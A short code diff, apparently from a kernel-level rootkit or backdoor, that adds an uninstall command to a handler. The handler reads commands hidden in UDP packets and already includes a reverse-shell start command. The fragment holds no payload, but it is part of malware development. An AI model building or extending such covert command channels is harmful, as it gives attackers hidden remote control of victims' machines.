@@ -61,6 +61,9 @@ static int process_and_execute_command(command_packet_t *command) {
     case COMMAND_REVERSE_SHELL_START:
         /* Will be handled by userspace */
         break;
+    case COMMAND_UNINSTALL:
+        /* Will be handled by userspace */
+        break;
     default:
         return -ENOENT; /* Normal UDP traffic */
     }
